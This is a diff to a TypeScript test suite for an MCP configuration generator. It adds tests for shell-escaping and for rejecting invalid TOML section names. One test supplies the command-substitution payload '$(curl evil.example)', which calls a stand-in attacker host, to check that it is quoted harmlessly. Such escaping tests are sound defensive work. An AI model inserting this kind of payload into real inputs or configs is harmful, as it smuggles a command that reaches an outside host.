@@ -36,6 +36,21 @@ describe('generateMCPConfig', () => {
       expect(result).toContain('SEMANTIK_AUTH_TOKEN=smtk_test123_secret');
     });
 
+    it('should shell-escape command substitution payloads in claude-code format', () => {
+      const result = generateMCPConfig(mockConfig, 'claude-code', '$(curl evil.example)');
+      expect(result).toContain("SEMANTIK_AUTH_TOKEN='$(curl evil.example)'");
+    });
+
+    it('should reject invalid TOML section headers for codex format', () => {
+      const invalidConfig: MCPClientConfig = {
+        ...mockConfig,
+        server_name: 'bad.name',
+      };
+      expect(() => generateMCPConfig(invalidConfig, 'codex', 'smtk_test123_secret')).toThrow(
+        'Invalid MCP server name for TOML output'
+      );
+    });
+
     it('should keep placeholder when apiKey is undefined', () => {
       const result = generateMCPConfig(mockConfig, 'standard');
       expect(result).toContain('<your-access-token-or-api-key>');
